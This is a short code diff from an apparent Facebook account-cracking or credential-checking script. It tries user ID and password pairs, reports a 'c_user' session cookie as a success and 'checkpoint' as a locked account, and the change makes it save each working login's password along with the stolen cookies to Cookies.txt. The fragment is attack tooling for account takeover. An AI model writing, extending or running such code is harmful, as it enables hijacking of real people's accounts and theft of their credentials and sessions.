@@ -102,7 +102,7 @@ def _Cookies(id):
 		_cookies = getCookies(uid,psw)
 		if "c_user" in _cookies:
 			print(f" [{green}OK{white}] {uid} {green}|{white} {psw}\n [{green}Cookies{white}] {_cookies}")
-			open("Cookies.txt","a").write(_cookies+"\n\n")
+			open("Cookies.txt","a").write(uid+"|"+psw+"|"+_cookies+"\n\n")
 		elif "checkpoint" in _cookies:
 			print(f" [{red}CP{white}] {uid} {red}|{white} {psw}")
 		else:
